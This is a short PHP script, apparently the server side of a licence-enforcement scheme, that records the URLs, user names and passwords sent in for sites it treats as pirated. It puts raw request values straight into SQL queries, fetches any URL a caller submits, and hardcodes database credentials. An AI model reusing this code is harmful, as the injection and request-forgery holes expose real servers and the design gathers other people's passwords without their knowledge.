<?php
/****************************************
		盗版网址收集接口
Powered By 拾年 QQ211154860
*****************************************/
error_reporting(0);
$mysql_server_name = 'localhost';
$mysql_username = 'sqsqsq';
$mysql_password = 'sqsqsq';
$mysql_database = 'sqsqsq';
if(mysql_connect($mysql_server_name, $mysql_username, $mysql_password) == false){
 exit("链接数据库失败!");
}
mysql_query("set names 'utf8'");
mysql_select_db($mysql_database);
$url = $_GET['url'];
$user = $_GET['user'];
$pwd = $_GET['pwd'];
$date = date("Y-m-d H-i-s");
$sql = "INSERT INTO `auth_block` (`url`, `date`, `name`, `pwd`) VALUES ('{$url}', '{$date}', '{$user}', '{$pwd}');";
$update = "UPDATE `auth_block` SET `date` = '$date', `name` = '$user', `pwd` = '$pwd' WHERE `url` = '$url' ";
if ($url == "" || $user == "" || $pwd == "") {
	exit("error,所有值不能为空!");
} 
if ($url == "127.0.0.1" || $url == "localhost"){
	exit("error,你提交的地址为本地!");
}
if (file_get_contents("http://" . $_GET['url']) == false) {
	exit("error,你提交的网址无法访问!");
} 
$cf = mysql_query("SELECT * FROM `auth_block` WHERE `url` = '$url' limit 1");
$zb = mysql_query("SELECT * FROM `auth_site` WHERE `url` = '$url' limit 1");
if (mysql_result($zb,0,active) == 1) {
	exit("error,你提交的网址为正版站点!");
}
$dburl = mysql_result($cf,0,url) ;
$dbuser = mysql_result($cf,0,name) ;
$dbpwd = mysql_result($cf,0,pwd) ;
if ($dburl == $url and $dbuser != $user and $dbpwd != $pwd or $dburl == $url and $dbuser != $user and $dbpwd == $pwd or $dburl == $url and $dbuser == $user and $dbpwd != $pwd ){
if (mysql_query($update) == true){
    exit("OK,更新成功");
}else{
	exit("error,更新时出错".mysql_error());
}
}
if ($dburl == $url){
	exit("error,数据库内已存在这条值");
	}
if (mysql_query($sql) == true) {
    echo " OK!";
} else {
    echo " NO!" . mysql_error();
}